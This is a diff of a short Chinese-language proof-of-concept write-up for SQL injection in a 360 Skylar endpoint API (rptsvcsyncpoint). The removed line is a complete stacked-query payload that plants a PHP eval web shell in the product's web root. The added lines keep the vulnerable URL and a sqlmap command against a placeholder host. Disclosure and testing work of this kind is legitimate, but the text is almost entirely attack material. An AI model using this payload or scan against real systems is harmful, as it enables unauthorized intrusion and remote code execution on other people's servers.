@@ -6,4 +6,13 @@
         
 ## 0x01 漏洞利用
 
-        /api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('<?php @eval($_POST[1]);?>');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\1.php';drop table O;--
+        /api/dp/rptsvcsyncpoint?ccid=1
+        
+        
+## 0x02 检测结果
+
+        python sqlmap.py -u https://x.x.x.x:8443/api/dp/rptsvcsyncpoint?ccid=1 --dbms PostgreSQL
+
+
+        ![图片](https://user-images.githubusercontent.com/118274389/229656248-0c2810cf-81dd-4dba-b482-cb235d90c638.png)
+
